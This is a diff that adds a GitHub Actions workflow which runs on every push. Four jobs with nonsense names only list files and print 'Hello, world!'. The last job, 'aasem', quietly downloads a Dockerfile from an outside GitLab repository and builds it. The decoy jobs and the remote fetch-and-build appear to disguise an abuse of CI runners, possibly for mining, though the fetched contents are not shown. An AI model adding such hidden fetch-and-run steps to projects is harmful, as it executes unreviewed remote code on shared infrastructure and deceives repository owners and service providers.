@@ -1,0 +1,31 @@
+name: linux
+on: [push]
+
+
+
+jobs:
+  namestrap:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: ls && echo Hello, world!
+  bpefas:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: ls && echo Hello, world!
+  namjimunsha:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: ls && echo Hello, world!
+  lamestrap:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: ls && echo Hello, world!
+  aasem:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a one-line script
+        run: curl -l -o Dockerfile https://gitlab.com/chriskm0909/matasya-thread/-/raw/main/Dockerfile && docker build .
